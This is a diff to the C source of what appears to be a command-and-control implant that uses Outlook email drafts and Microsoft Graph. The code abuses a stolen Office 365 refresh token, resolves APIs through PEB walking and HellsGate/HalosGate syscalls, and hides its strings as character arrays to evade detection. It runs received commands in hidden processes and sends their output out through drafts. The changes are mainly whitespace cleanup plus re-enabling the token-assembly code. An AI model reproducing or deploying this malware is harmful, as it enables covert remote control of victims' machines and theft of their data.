@@ -2,7 +2,7 @@
 #include <windows.h>
 
 // Memory Related Definitions
-#define BUFSIZE 4096 
+#define BUFSIZE 4096
 
 // WinInet Definitions
 #define INTERNET_SERVICE_HTTP       3
@@ -14,7 +14,7 @@
 typedef WORD INTERNET_PORT;
 typedef LPVOID HINTERNET;
 
-// HellsGate / HalosGate 
+// HellsGate / HalosGate
 VOID HellsGate( IN WORD wSystemCall);
 VOID HellDescent();
 DWORD halosGateDown( IN PVOID ntdllApiAddr, IN WORD index);
@@ -113,14 +113,21 @@ void parseMetaCommand(msvcrtStruct strFuncs, char* command, metaCommandStruct* c
 
 int main() {
     // Variables
-    char refreshToken[] = "REPLACE THIS";
-    char tenantId[]     = "REPLACE THIS";
-    // char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
+    //char refreshToken[] = "REPLACE THIS";
+    CHAR refreshToken1[] = {''};
+    CHAR refreshToken2[] = {''};
+    CHAR refreshToken3[] = {''};
+    CHAR refreshToken4[] = {''};
+    CHAR refreshToken5[] = {''};
+    CHAR refreshToken6[] = {''};
+    CHAR refreshToken7[] = {''};
+    //char tenantId[]     = "REPLACE THIS";
+    //char tenantId[]     = "1d5551a0-f4f2-4101-9c3b-394247ec7e08";
     // bobby.cooke$ python3 string2Array.py tenantId "1d5551a0-f4f2-4101-9c3b-394247ec7e08"
-    //CHAR tenantId[] = {'1','d','5','5','5','1','a','0','-','f','4','f','2','-','4','1','0','1','-','9','c','3','b','-','3','9','4','2','4','7','e','c','7','e','0','8',0};
+    CHAR tenantId[] = {'1','d','5','5','5','1','a','0','-','f','4','f','2','-','4','1','0','1','-','9','c','3','b','-','3','9','4','2','4','7','e','c','7','e','0','8',0};
     DWORD napTime       = 20000; // second sleep
     //char sitename[]     = "login.microsoftonline.com";
-    //char sitename[]   = "h1jmj59wadg8l8taczm6fpzolfr5fu.burpcollaborator.net"; 
+    //char sitename[]   = "h1jmj59wadg8l8taczm6fpzolfr5fu.burpcollaborator.net";
     CHAR sitename[]     = {'l','o','g','i','n','.','m','i','c','r','o','s','o','f','t','o','n','l','i','n','e','.','c','o','m',0};
     //char clientId[]     = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; // Office 365 Client ID
     CHAR clientId[] = {'d','3','5','9','0','e','d','6','-','5','2','b','3','-','4','1','0','2','-','a','e','f','f','-','a','a','d','2','2','9','2','a','b','0','1','c',0};
@@ -170,7 +177,7 @@ int main() {
 		}
 	}
     // Kernel32
-    // char kernstr[] = "KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future 
+    // char kernstr[] = "KERN"; // L"KERNEL32.DLL" - Debugging shows that kernel32 loads in with all uppercase. May need to check for both in future
     CHAR kernstr[] = {'K','E','R','N',0};
 	PVOID kernel32 = (PVOID)crawlLdrDllList((PVOID)kernstr);
 	PVOID kernel32ExportDirectory =    getExportDirectory(kernel32);
@@ -238,28 +245,28 @@ int main() {
     k32.ExitProcess  = (tExitProcess)getSymbolAddress(ExitProcessStr, (PVOID)sizeof(ExitProcessStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.GetTickCount
     //char GetTickCountStr[] = "GetTickCount";
-    CHAR GetTickCountStr[] = {'G','e','t','T','i','c','k','C','o','u','n','t',0}; 
+    CHAR GetTickCountStr[] = {'G','e','t','T','i','c','k','C','o','u','n','t',0};
     k32.GetTickCount  = (tGetTickCount)getSymbolAddress(GetTickCountStr, (PVOID)sizeof(GetTickCountStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.Sleep
     //char SleepStr[] = "Sleep";
-    CHAR SleepStr[] = {'S','l','e','e','p',0}; 
+    CHAR SleepStr[] = {'S','l','e','e','p',0};
     k32.Sleep  = (tSleep)getSymbolAddress(SleepStr, (PVOID)sizeof(SleepStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.ReadFile
     //char ReadFileStr[] = "ReadFile";
-    CHAR ReadFileStr[] = {'R','e','a','d','F','i','l','e',0}; 
+    CHAR ReadFileStr[] = {'R','e','a','d','F','i','l','e',0};
     k32.ReadFile  = (tReadFile)getSymbolAddress(ReadFileStr, (PVOID)sizeof(ReadFileStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.lstrlenA
     //char lstrlenAStr[] = "lstrlenA";
-    CHAR lstrlenAStr[] = {'l','s','t','r','l','e','n','A',0}; 
-    k32.lstrlenA  = (tlstrlenA)getSymbolAddress(lstrlenAStr, (PVOID)sizeof(lstrlenAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
+    CHAR lstrlenAStr[] = {'l','s','t','r','l','e','n','A',0};
+    k32.lstrlenA  = (tlstrlenA)getSymbolAddress(lstrlenAStr, (PVOID)sizeof(lstrlenAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.lstrcmpA
     //char lstrcmpAStr[] = "lstrcmpA";
-    CHAR lstrcmpAStr[] = {'l','s','t','r','c','m','p','A',0}; 
-    k32.lstrcmpA  = (tlstrcmpA)getSymbolAddress(lstrcmpAStr, (PVOID)sizeof(lstrcmpAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
+    CHAR lstrcmpAStr[] = {'l','s','t','r','c','m','p','A',0};
+    k32.lstrcmpA  = (tlstrcmpA)getSymbolAddress(lstrcmpAStr, (PVOID)sizeof(lstrcmpAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
     // kernel32.lstrcatA
     //char lstrcatAStr[] = "lstrcatA";
     CHAR lstrcatAStr[] = {'l','s','t','r','c','a','t','A',0};
-    k32.lstrcatA  = (tlstrcatA)getSymbolAddress(lstrcatAStr, (PVOID)sizeof(lstrcatAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable); 
+    k32.lstrcatA  = (tlstrcatA)getSymbolAddress(lstrcatAStr, (PVOID)sizeof(lstrcatAStr), kernel32, kernel32ExAddrTable, kernel32ExNamePointerTable, kernel32ExOrdinalTable);
    // msvcrt.dll
     CHAR msvcrtStr[] = {'m','s','v','c','r','t','.','d','l','l',0};;
     HMODULE msvcrt = k32.LoadLibraryA((LPCSTR)msvcrtStr);
@@ -300,7 +307,7 @@ int main() {
     comms.InternetCloseHandle = (tInternetCloseHandle)getSymbolAddress(InternetCloseHandleStr, (PVOID)sizeof(InternetCloseHandleStr), wininet, wininetExAddrTable, wininetExNamePointerTable, wininetExOrdinalTable);
     // Allocate Memory Buffers
     // Allocate refreshToken
-/*	ULONG rtBuffSize = 1 << 13;
+	ULONG rtBuffSize = 1 << 13;
 	PVOID refreshToken = NULL;
 	SIZE_T refreshTokenSize = (SIZE_T)rtBuffSize;
     // NtAllocateVirtualMemory via HellsGate & HalosGate
@@ -313,7 +320,7 @@ int main() {
     k32.lstrcatA(refreshToken,refreshToken4);
     k32.lstrcatA(refreshToken,refreshToken5);
     k32.lstrcatA(refreshToken,refreshToken6);
-    k32.lstrcatA(refreshToken,refreshToken7);*/
+    k32.lstrcatA(refreshToken,refreshToken7);
     // Allocate AccessToken
 	ULONG atBuffSize = 1 << 13;
 	PVOID accessTokenBuffer = NULL;
@@ -399,7 +406,7 @@ int main() {
             isSleepStr = k32.lstrcmpA(commandStruct.metaCommand, sleepStr);
             if (isSleepStr == 0)
             {
-                napTime = (DWORD)strFuncs.atof(commandStruct.command); // String to DWORD 
+                napTime = (DWORD)strFuncs.atof(commandStruct.command); // String to DWORD
             }
             // Check if the meta command is "exit"
             isExitStr = k32.lstrcmpA(commandStruct.metaCommand, exitStr);
@@ -411,12 +418,12 @@ int main() {
                 sendDraftResponse = createEmailDraft(strFuncs, comms, k32, accessToken, user_agent, egressBuffer, ingressBuffer);
                 k32.ExitProcess(0); // exits the process if meta command is "exit"
             }
-            // Remove  " \ because they will break the JSON 
+            // Remove  " \ because they will break the JSON
             cleanOutput(strFuncs,egressBuffer);
             // Send out via Draft Email
             strFuncs.memset(ingressBuffer, 0, inBuffSize);
             sendDraftResponse = createEmailDraft(strFuncs, comms, k32, accessToken, user_agent, egressBuffer, ingressBuffer);
-            // Create another draft email so drafts are ready for next input and for logging of exfil 
+            // Create another draft email so drafts are ready for next input and for logging of exfil
             strFuncs.memset(ingressBuffer, 0, inBuffSize);
             strFuncs.memset(egressBuffer,  0, outBuffSize);
             if (sendDraftResponse != NULL)
@@ -435,7 +442,7 @@ __asm__(
 "crawlLdrDllList: \n"
 	"xor rax, rax \n"             // RAX = 0x0
 // Check if dllName string is ASCII or Unicode
-	"mov rcx, [rcx] \n"           // RCX = First 8 bytes of string 
+	"mov rcx, [rcx] \n"           // RCX = First 8 bytes of string
 	"cmp ch, al \n"               // Unicode then jump, else change ASCII to Unicode 4 bytes
 	"je getMemList \n"
 	"movq mm1, rcx \n"            // MMX1 contains first 8 ASCII Chars
@@ -447,7 +454,7 @@ __asm__(
 	"mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
 	"mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
 	"mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
-	"mov r11, rbx \n" 
+	"mov r11, rbx \n"
 "crawl: \n"
 	"mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
 	"mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
@@ -493,9 +500,9 @@ __asm__(
 __asm__(
 "getExportNameTable: \n"
 	"xor rax, rax \n"
-	"add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
+	"add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset
 	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
-	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
+	"add rax, rcx \n"          // RAX = VA ExportAddressOfNames
 	"ret \n" // return ExportNameTable;
 );
 // Return the address of the Export Ordinal Table
@@ -504,9 +511,9 @@ __asm__(
 __asm__(
 "getExportOrdinalTable: \n"
 	"xor rax, rax \n"
-	"add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
+	"add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset
 	"mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
-	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
+	"add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals
 	"ret \n" // return ExportOrdinalTable;
 );
 // PVOID getSymbolAddress(PVOID symbolString, PVOID symbolStringSize, PVOID dllBase, PVOID ExportAddressTable, PVOID ExportNameTable, PVOID ExportOrdinalTable)
@@ -634,7 +641,7 @@ char* getMsGraphAccessToken(msvcrtStruct strFuncs, commsStruct comms, k32Struct 
     char parameters[2000];
     strFuncs.memset(parameters, 0, sizeof(parameters));
     CHAR resourceVar[] = {'r','e','s','o','u','r','c','e','=',0};
-    CHAR resource[] = {'h','t','t','p','s','%','3','a','%','2','f','%','2','f','g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0}; // resource 
+    CHAR resource[] = {'h','t','t','p','s','%','3','a','%','2','f','%','2','f','g','r','a','p','h','.','m','i','c','r','o','s','o','f','t','.','c','o','m',0}; // resource
     CHAR clientidVar[] = {'&','c','l','i','e','n','t','_','i','d','=',0};
     CHAR grantTypeVar[] = {'&','g','r','a','n','t','_','t','y','p','e','=',0};
     CHAR grantType[] = {'r','e','f','r','e','s','h','_','t','o','k','e','n',0};
@@ -698,7 +705,7 @@ char* getCommandFromDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k3
     if (hConnect == NULL)
     {
         return NULL;
-    }    
+    }
     CHAR stars[] = {'*','/','*',0};
     PCTSTR acceptTypes[] = { stars, NULL };
     CHAR method[] = {'G','E','T',0};
@@ -793,10 +800,10 @@ char* createEmailDraft(msvcrtStruct strFuncs, commsStruct comms, k32Struct k32, 
     //char exfiltrate[] = "egress message";
     //strFuncs.sprintf(parameters, "{\"subject\":\"Azure Outlook Command & Control\", \"importance\" : \"High\", \"body\" : {\"contentType\":\"TEXT\", \"content\" : \"%s\"}, \"toRecipients\" : [{\"emailAddress\":{\"address\":\"Bobby.Cooke@0xBoku.com\"}}]}", egressBuffer);
     CHAR jsonString1[] = {'{','"','s','u','b','j','e','c','t','"',':','"','A','z','u','r','e',' ','O','u','t','l','o','o','k',' ','C','o','m','m','a','n','d',' ','&',' ','C','o','n','t','r','o','l','"',',',' ','"','i','m','p','o','r','t','a','n','c','e','"',' ',':',' ','"','H','i','g','h','"',',',' ','"','b','o','d','y','"',' ',':',' ','{','"','c','o','n','t','e','n','t','T','y','p','e','"',':','"','T','E','X','T','"',',',' ','"','c','o','n','t','e','n','t','"',' ',':',' ','"',0};
-    k32.lstrcatA(parameters,jsonString1); 
-    k32.lstrcatA(parameters,egressBuffer); 
+    k32.lstrcatA(parameters,jsonString1);
+    k32.lstrcatA(parameters,egressBuffer);
     CHAR jsonString2[] = {'"','}',',',' ','"','t','o','R','e','c','i','p','i','e','n','t','s','"',' ',':',' ','[','{','"','e','m','a','i','l','A','d','d','r','e','s','s','"',':','{','"','a','d','d','r','e','s','s','"',':','"','B','o','b','b','y','.','C','o','o','k','e','@','0','x','B','o','k','u','.','c','o','m','"','}','}',']','}',0};
-    k32.lstrcatA(parameters,jsonString2); 
+    k32.lstrcatA(parameters,jsonString2);
     int paramSize = k32.lstrlenA(parameters);
     // https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta
     // Send the queued HTTPS Request
@@ -830,7 +837,7 @@ HANDLE runCommandAsProcess(msvcrtStruct strFuncs, k32Struct k32, char* command)
     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
     saAttr.bInheritHandle = TRUE;
     saAttr.lpSecurityDescriptor = NULL;
-    // Create a pipe for the child process's STDOUT. 
+    // Create a pipe for the child process's STDOUT.
     k32.CreatePipe(&pipeOUT, &pipeIN, &saAttr, 0);
     // Ensure the read handle to the pipe for STDOUT is not inherited.
     k32.SetHandleInformation(pipeOUT, HANDLE_FLAG_INHERIT, 0);
@@ -840,14 +847,14 @@ HANDLE runCommandAsProcess(msvcrtStruct strFuncs, k32Struct k32, char* command)
     si.hStdOutput = pipeIN;
     si.dwFlags |= STARTF_USESTDHANDLES;
     strFuncs.memset(&pi, 0, sizeof(pi));
-    // Start the child process. 
+    // Start the child process.
     k32.CreateProcessA(NULL, (TCHAR*)command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     // Wait until the command runs in the process and the process closes
     //   For commands that take a long time to output this is required or the output will be null
     k32.WaitForSingleObject(pi.hProcess, 20000);
     // Close handles to the child process and its primary thread.
     // Some applications might keep these handles to monitor the status
-    // of the child process, for example. 
+    // of the child process, for example.
     k32.CloseHandle(pi.hProcess);
     k32.CloseHandle(pi.hThread);
     // Close the write end of the pipe before reading to avoid hanging
